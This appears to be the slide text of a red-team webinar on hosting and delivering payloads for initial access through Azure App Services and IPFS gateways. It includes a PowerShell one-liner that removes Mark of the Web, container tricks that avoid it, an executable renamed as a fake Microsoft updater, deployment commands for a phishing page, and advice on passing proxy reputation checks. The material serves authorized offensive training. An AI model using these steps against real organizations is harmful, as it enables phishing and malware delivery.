WEBINAR TOPICS
INTRODUCTION
• Threat-actors often have a goal in mind when targeting 
an organization. That goal will require some sort of 
access to data. 
• Access to data may be targeted, opportunistic, or even 
paid for. 
• Offensive goals:
• Ransomware
• Intellectual Property Theft
• Service Disruption
• Kinetic

FILE SERVING
Payloads, delivery methods, and additional considerations.
• User-Interaction
• Clicking a link.
• Downloading a file.
• Entering credentials (usernames,passwords,codes).
• Opening an email.
• Code execution
• Malware/C2.
• Ransomware.
• Automated tooling.
• Access to read/write target data.
Initial Access 
Requirements
PAYLOADS

10

11
HOSTING 
CONSIDERATIONS
• Where are your files stored?
• Virtual Private Servers
• On-Prem
• Third-Party Services (Office 365, Google Drive)
• AWS Buckets
• Azure Storage
• How will your target reach the file?
• Web Browser (Chrome? Edge?)
• Do they traverse through a proxy?
• TLS Inspection
• DNS or IP Address?
• Reputation/categorization
12
THIRD PARTY SERVICES
• Understand the terms 
of service.
• Secure the 
infrastructure.
• Consider the geo 
location.
• Beware the ban 
hammer!

• Shortcuts
• Office Docs
• Email pretext/links
14
COMMON DROPPER SITES

MIME TYPES
• Identifies the type of media being served.
• Some platforms or protections may block certain MIME 
types.
• May be controlled by web.config.
• Header: “Content-Type: application/pdf”
• application/vnd.microsoft.portable-executable
• application/vnd.ms-powerpoint
• application/octet-stream
17
MARK OF THE WEB -
MOTW
• Alternate Data Stream 
“MicrosoftUpdater.exe:Zone.Identifier$DATA”.
• Provides software the ability to determine security 
features of files such as those downloaded from the 
Internet.
18
ALTERNATE DATA 
STREAM EXAMPLE
• Users may “Unblock” the file(s) without administrative 
privileges.
• Some do it if you ask nicely by email 
BLOCKED FILES
MOTW CONTINUED
• Remove with PowerShell
ls C:\Users\User\Downloads\*.* | Unblock-File
• Some files and programs do not apply the 
Zone.Identifier to files inside a container. Examples are 
.iso/.img files when double clicked and when 7zip opens 
a file.
21
PROXY CONSIDERATIONS
• Organizations may monitor boundary traffic for:
• DNS Twisted Domains
• Newly Registered Domains
• Uncategorized Domains
• Dotted-quads; 199.x.x.x
• Known-bad IP’s or service ranges
• We need a domain or service with a good reputation.
• We need options. APT groups have time and $$ while 
professional offensive practitioners are limited mainly 
by time.
22
Azure App 
Services
AzURE APP SERVICES
• Host files on https://domain.azurewebsites.net.
• Several platform options
• Python
• .NET,.NET CORE
• NodeJS
• PHP
• Deployable with UI or programmatically.
• May also perform C2 redirection.
24
Azure app tools 
setup
• Clone the repo
https://github.com/rvrsh3ll/Azure-App-Tools
• Modify the default index.html or other code to suit your 
needs.
• Copy calc.exe to test file downloads. 
cp /mnt/c/Windows/System32/calc.exe MicrosoftUpdater.exe
• Download and install Azure-cli
• https://docs.microsoft.com/en-us/cli/azure/install-azure-cli-
windows?tabs=azure-cli
25
dropper
• Note: Comment the “File Download Popup” if you’re not 
file serving. 
26
WEB.CONFIG
• Enable Azure file downloads on IIS.
27
Azure app tools 
deployment
cd Azure-App-Tools/HTML-Phishing-Page/
az login
az webapp up --location eastus --resource-group myazureapps --name 
mycustomsubdomain --html
• When complete, your site will be browsable at 
https://mycustomsubdomain.azurewebsites.net
• Note: A unique-to-azure subdomain is required.

Interplanetary 
File System
IPFS
IPFS
INTRO
• The InterPlanetary File System (IFPS)
• https://ipfs.io
• When you add a file to IPFS, your file is split into smaller 
chunks, cryptographically hashed, and given a unique 
fingerprint called a content identifier (CID). This CID acts 
as a permanent record of your file as it exists at that 
point in time.
•
33
IPFS LOOKUP
• When other nodes look up your file, they ask their peer 
nodes who's storing the content referenced by the file's 
CID. When they view or download your file, they cache a 
copy — and become another provider of your content 
until their cache is cleared.
34
WHAT CAN I DO WITH 
IPFS
• Serve single files.
• Raw text
• Binary
• Office Docs
• NFT?
• Serve a website
• JavaScript file dropper
• Clone target
• Command and Control

IPFS
GATEWAYS
• https://ipfs.github.io/public-gateway-checker/ 
• https://ipfs.io/ipfs/
• https://cloudflare-ipfs.io/ipfs/
38
• Does not like Double-NAT.
• Works well from a VPS with or host with port 4001 open 
or forwarded.
• The command-line version hosts a web interface as well.
• Try multiple gateways.
